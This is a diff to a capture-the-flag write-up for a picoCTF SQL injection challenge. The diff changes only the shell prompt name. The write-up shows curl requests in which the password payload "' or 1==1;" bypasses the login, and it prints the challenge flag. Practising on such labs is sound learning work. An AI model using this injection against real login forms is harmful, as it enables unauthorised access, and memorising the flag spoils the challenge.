@@ -10,19 +10,19 @@ Try to think about how the website verifies your login.
 ## Solution
 
 ```
-ulise@SSJ2 MINGW64 /d/Downloads/notas-hacking (main)
+VFlours@win MINGW64 /d/Downloads/notas-hacking (main)
 $ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=password&debug=1"
 <pre>username: admin
 password: password
 SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
 </pre><h1>Login failed.</h1>
-ulise@SSJ2 MINGW64 /d/Downloads/notas-hacking (main)
+VFlours@win MINGW64 /d/Downloads/notas-hacking (main)
 $ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=' or 1==1;&debug=1"
 <pre>username: admin
 password: ' or 1==1;
 SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
 </pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>
-ulise@SSJ2 MINGW64 /d/Downloads/notas-hacking (main)
+VFlours@win MINGW64 /d/Downloads/notas-hacking (main)
 
 
 
